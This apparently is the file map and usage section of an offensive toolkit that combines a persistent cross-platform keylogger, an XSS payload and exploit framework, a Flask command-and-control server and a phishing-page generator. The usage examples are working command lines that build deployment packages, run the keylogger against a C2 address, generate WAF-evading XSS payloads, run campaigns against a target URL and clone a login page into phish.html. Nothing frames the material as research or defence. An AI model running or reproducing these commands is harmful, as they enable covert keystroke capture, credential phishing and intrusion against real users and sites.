# KLG-XSS HAILAMDEV - File Structure

## Core Modules
- core/__init__.py
- core/keylogger.py - Cross-platform keylogger with persistence
- core/xss_framework.py - XSS payload generator, scanner, exploit framework

## Server
- server/c2_server.py - Flask C2 server with admin panel

## Modules (CLI Tools)
- modules/klg_tool.py - Keylogger management
- modules/xss_tool.py - XSS operations

## Deployment
- deploy/build.py - Multi-platform package builder

## Configuration
- config/default.json - Main configuration
- config/targets.csv - XSS campaign target template

## Entry Point
- launcher.py - Unified CLI

## Documentation
- README.md - Complete documentation
- requirements.txt - Python dependencies

## Usage Examples

### Start C2 Server
python launcher.py c2 --port 8080

### Build Deployment Packages
python launcher.py build --platform all --c2 http://C2_IP:8080

### Run Keylogger
python launcher.py keylogger --c2 http://C2_IP:8080

### Generate XSS Payloads
python launcher.py xss generate --context HTML_BODY --waf --count 30

### Scan Target
python launcher.py xss scan --url http://target.com --param q --waf

### Run Campaign
python launcher.py xss campaign --name test --url http://target.com --param search

### Generate Phishing Page
python launcher.py xss phishing --target-url http://target.com/login --output phish.html

### Manage Sessions
python launcher.py manage list --c2 http://C2_IP:8080